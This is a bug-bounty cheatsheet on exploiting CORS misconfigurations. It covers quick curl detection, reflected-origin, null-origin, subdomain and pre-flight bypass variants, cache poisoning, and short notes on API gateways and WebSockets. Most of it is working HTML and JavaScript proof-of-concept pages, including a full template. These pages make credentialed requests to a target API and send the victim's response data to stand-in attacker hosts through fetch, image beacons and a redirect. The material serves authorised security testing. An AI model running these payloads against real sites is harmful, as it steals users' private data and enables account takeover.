---
tags: [bugbounty, vuln/cors, cheatsheet, p2, p3]
aliases: [CORS, Cross-Origin Resource Sharing, CORS Misconfiguration]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# CORS Misconfiguration

> [!tldr] Hunter Summary
> **What:** Server reflects arbitrary Origin header + Access-Control-Allow-Credentials: true → attacker can read victim's API responses.
> **Impact:** Data theft, ATO if token/session readable cross-origin.
> **Best targets:** Any authenticated API endpoint with ACAO header.
> **Time to triage:** 5 min. Send request with `Origin: https://evil.com`. Check response headers.

---

## Quick Detection

```bash
# Manual
curl -sI "https://target.com/api/user/profile" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=YOUR_SESSION" \
  | grep -i "access-control"

# Positive: both of these = vulnerable + exploitable
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

---

## Exploitation Types

### Type 1 — Arbitrary Origin Reflected
```bash
# Server reflects whatever Origin you send
Request:  Origin: https://attacker.com
Response: Access-Control-Allow-Origin: https://attacker.com
          Access-Control-Allow-Credentials: true

# PoC — steal data
```

```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  fetch('https://attacker.com/steal?d=' + btoa(this.responseText));
};
req.open('GET', 'https://target.com/api/user/profile', true);
req.withCredentials = true;
req.send();
</script>
```

### Type 2 — Null Origin
```bash
Request:  Origin: null
Response: Access-Control-Allow-Origin: null

# Exploit via sandboxed iframe:
```
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
        srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = function() { 
  top.location = 'https://attacker.com/steal?d=' + btoa(this.responseText); 
};
req.open('GET', 'https://target.com/api/secret', true);
req.withCredentials = true;
req.send();
</script>"></iframe>
```

### Type 3 — Subdomain Match Only
```
Origin: https://evil.target.com  (if you can take over a subdomain)
Origin: https://notreally-target.com  (prefix match)
Origin: https://target.com.evil.com  (suffix confusion)
```

### Type 4 — Pre-flight bypass
```bash
# Some endpoints only validate on pre-flight OPTIONS, not actual request
curl -X POST "https://target.com/api/action" \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/json" \
  -d '{}' -b "session=VICTIM"
```

---

## CORS + Cache Poisoning
If the ACAO header is cached:
```
GET /api/user HTTP/1.1
Origin: https://evil.com
# If 200 with ACAO: evil.com gets cached → all users get that CORS header
```

---

## Full PoC Template

```html
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h2>CORS Data Theft PoC</h2>
<pre id="output">Loading...</pre>
<script>
function exploit() {
  var req = new XMLHttpRequest();
  req.onreadystatechange = function() {
    if (this.readyState === 4) {
      document.getElementById('output').textContent = 
        'Status: ' + this.status + '\n' + this.responseText;
      // Also exfil
      new Image().src = 'https://ATTACKER.com/steal?' + 
        encodeURIComponent(this.responseText.substring(0, 500));
    }
  };
  req.open('GET', 'https://TARGET.com/api/user/profile', true);
  req.withCredentials = true;
  req.send();
}
exploit();
</script>
</body>
</html>
```

---

## 2025-2026 Notes

> [!info] CORS (2025-2026)
> - **API gateway CORS misconfig:** Managed API gateways (AWS API Gateway, Kong) sometimes configured with `*` + allow-credentials (impossible per spec, but some custom implementations do it)
> - **WebSocket CORS:** WS origin header not validated — any origin can connect
> - **Fetch mode no-cors:** Browser blocks JS from reading no-cors response, but server still receives request and performs action — CSRF via fetch

---

## References

- PortSwigger CORS — https://portswigger.net/web-security/cors
- James Kettle CORS exploitation — https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
